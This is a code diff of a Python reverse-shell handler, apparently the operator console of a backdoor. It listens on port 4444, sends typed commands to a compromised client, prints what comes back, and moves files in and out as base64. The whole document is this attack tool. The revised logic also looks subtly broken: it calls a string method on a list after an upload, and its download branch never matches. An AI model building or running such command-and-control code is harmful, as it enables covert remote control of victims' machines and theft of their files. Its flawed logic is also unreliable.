@@ -8,34 +8,34 @@ from colorama import Fore, Style, init
 init(autoreset=True)
 
 # Server configuration
-HOST = "0.0.0.0"  # Replace with your server's IP address
+HOST = "127.0.0.1"  # Replace with your server's IP address
 PORT = 4444  # Replace with your desired port
 
 # Function to send JSON data
-def send_json(sock, data):
+def send_json(conn, data):
     json_data = json.dumps(data)
-    sock.send(json_data.encode())
+    conn.send(json_data.encode())
 
 # Function to receive JSON data
-def receive_json(sock):
+def receive_json(conn):
     json_data = ""
     while True:
         try:
-            json_data += sock.recv(1024).decode()
+            json_data += conn.recv(1024).decode()
             return json.loads(json_data)
         except ValueError:
             continue
 
-# Function to read a file and encode it in base64
-def read_file(path):
-    with open(path, "rb") as file:
-        return base64.b64encode(file.read()).decode()
-
-# Function to write a file from base64 encoded content
+# Function to write file
 def write_file(path, content):
-    with open(path, "wb") as file:
+    with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
         file.write(base64.b64decode(content))
         return "[+] Download successful [+]"
+
+# Function to read file
+def read_file(path):
+    with open(path, "rb") as file:  # RB FOR READABLE BINARY FILE
+        return base64.b64encode(file.read()).decode()  # Decode bytes to string
 
 # Print starting message
 print(Fore.GREEN + "Starting TCP Handler...")
@@ -52,29 +52,41 @@ print(Fore.GREEN + f"Connection established with {client_address}")
 
 try:
     while True:
-        # Get user input
-        command = input(Fore.CYAN + "> ").strip().split(" ")
+        # Receive the prompt from the client
+        prompt = receive_json(client_socket)
+        print(Fore.CYAN + prompt, end="")
 
-        # Handle the 'upload' command
-        if command[0] == "upload":
+        # Get user input
+        command = input()
+
+        # Handle upload command
+        if command.startswith("upload"):
             try:
-                file_content = read_file(command[1])
-                command.append(file_content)
-            except Exception as e:
-                print(Fore.RED + f"Error reading file: {e}")
+                _, filename = command.split(" ", 1)
+                file_content = read_file(filename)
+                command = [command, file_content]
+            except Exception:
+                print(Fore.RED + "[+] Error reading file for upload [+]")
                 continue
 
         # Send the command to the client
         send_json(client_socket, command)
 
+        if command.lower() == "km":
+            print(Fore.RED + "Disconnecting from client...")
+            client_socket.close()
+            break
+
         # Receive the output from the client
         output = receive_json(client_socket)
 
-        if command[0] == "download":
+        # Handle download command
+        if isinstance(command, list) and command[0].startswith("download"):
             try:
-                output = write_file(command[1], output)
-            except Exception as e:
-                output = f"Error saving downloaded file: {e}"
+                _, filename = command
+                output = write_file(filename, output)
+            except Exception:
+                output = "[+] Error during download [+]"
 
         print(Fore.WHITE + output)
 
